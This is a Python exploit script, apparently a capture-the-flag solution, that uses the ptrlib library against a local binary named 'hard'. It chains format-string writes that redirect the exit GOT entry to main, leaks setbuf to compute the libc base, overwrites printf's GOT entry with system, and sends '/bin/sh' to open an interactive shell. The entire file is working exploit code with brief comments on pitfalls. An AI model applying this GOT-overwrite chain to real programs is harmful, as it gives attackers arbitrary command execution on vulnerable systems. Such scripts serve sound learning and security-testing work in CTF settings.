from ptrlib import *

binpath = './hard'
libcpath = '/usr/lib/libc.so.6'

proc = Process(binpath)
elf = ELF(binpath)
libc = ELF(libcpath)

# could't leak __libc_start_main, so leak setbuf
# because setbuf is called onece, setbuf_got points the libc_setbuf
# it's not a 64bit data so, make it in to 64bit data at first, and then send it
# b"%7$s" (= 0x25 0x37 0x24 0x73 0x00)
# u64(b"%7$s")  (= 0x25 0x37 0x24 0x73 0x00 0x00 0x00 0x00)

# !!!!!!coution!!!!!!!
# puts() send \n after "" so, if when receve() will receve \n
# and recve 0xa.
# don't forget to sendafter("\n")!!!!!

# libc.base = check's 3 mibbles

def exit2main():
    exit_got_address = elf.got("exit")
    main_address = elf.symbol("main")
    writes = {
        exit_got_address: main_address
    }
    payload = fsb(
        6, writes, bs=2, bits=64, size=4
    )
    proc.sendafter("Input message\n", payload)

def leak_libc():
    setbuf_got_address = elf.got("setbuf")
    payload = flat(
            [
                u64(b"%7$s"),
                setbuf_got_address
            ],
            map=p64
    )
    proc.sendafter("Input message\n", payload)
    setbuf_libc_address = u64(proc.recv(6))
    offset_setbuf = libc.symbol("setbuf")
    libc.base = setbuf_libc_address - offset_setbuf

def printf2system():
    printf_got_address = elf.got("printf")
    system_address = libc.symbol("system")
    writes = {
        printf_got_address: system_address
    }
    payload = fsb(
        6, writes, bs=2, bits=64, size=4
    )
    proc.sendafter("Input message\n", payload)

def binsh2rdi():
    proc.sendafter("Input message\n", p64(u64("/bin/sh")))

def attack():
    exit2main()
    leak_libc()
    printf2system()
    binsh2rdi()
    proc.interactive()

if __name__ == "__main__":
    attack()
